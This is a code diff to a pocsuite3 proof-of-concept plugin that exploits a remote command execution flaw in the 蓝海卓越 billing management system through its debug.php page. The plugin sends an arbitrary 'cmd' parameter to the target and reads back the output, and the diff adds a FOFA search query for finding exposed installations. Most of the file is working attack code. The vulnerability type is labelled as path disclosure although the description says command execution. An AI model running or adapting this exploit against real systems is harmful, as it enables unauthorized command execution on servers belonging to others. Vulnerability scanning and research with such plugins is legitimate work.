@@ -1,3 +1,8 @@
+"""
+If you have issues about development, please read:
+https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
+for more about information, plz visit https://pocsuite.org
+"""
 import re, base64
 from pocsuite3.lib.core.data import logger
 from collections import OrderedDict
@@ -9,16 +14,17 @@ from pocsuite3.lib.utils import get_middle_text
 
 class DemoPOC(POCBase):
     vulID = '12'  
-    author = ['']
+    author = ['PeiQi']
     name = '蓝海卓越 计费管理系统 debug.php 远程命令执行漏洞'
+    vulType = VUL_TYPE.PATH_DISCLOSURE
     desc = '''蓝海卓越计费管理系统 debug.php 存在命令调试页面，导致攻击者可以远程命令执行
     '''
     appPowerLink = '蓝海卓越'
     appName = '蓝海卓越计费管理系统'
     appVersion = '未知版本'
+    fofa_dork = {'fofa': 'title=="蓝海卓越计费管理系统"'} 
     samples = []
     install_requires = ['']
-    vulType = VUL_TYPE.PATH_DISCLOSURE
     category = POC_CATEGORY.EXPLOITS.WEBAPP
 
     def _options(self):
@@ -34,13 +40,13 @@ class DemoPOC(POCBase):
         }
         data = "cmd=" + self.get_option("cmd")
         try:
-            r = requests.post(url, data=data, headers=headers, timeout=5)
-            if r.status_code == 200 and "uid=" in r.text:
+            resp = requests.post(url, data=data, headers=headers, timeout=5)
+            if "uid=" in resp.text and resp.status_code == 200:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = url
                 result['VerifyInfo']['File'] = self.get_option("cmd")
-                result['VerifyInfo']['Response'] = r.text
-        except:
+                result['VerifyInfo']['Response'] = resp.text
+        except Exception as ex:
             pass
 
         return self.parse_output(result)
@@ -53,13 +59,13 @@ class DemoPOC(POCBase):
         }
         data = "cmd=" + self.get_option("cmd")
         try:
-            r = requests.post(url, data=data, headers=headers, timeout=5)
-            if r.status_code == 200:
+            resp = requests.post(url, data=data, headers=headers, timeout=5)
+            if resp.status_code == 200:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = url
                 result['VerifyInfo']['File'] = self.get_option("cmd")
-                result['VerifyInfo']['Response'] = r.text
-        except:
+                result['VerifyInfo']['Response'] = resp.text
+        except Exception as ex:
             pass
 
         return self.parse_output(result)
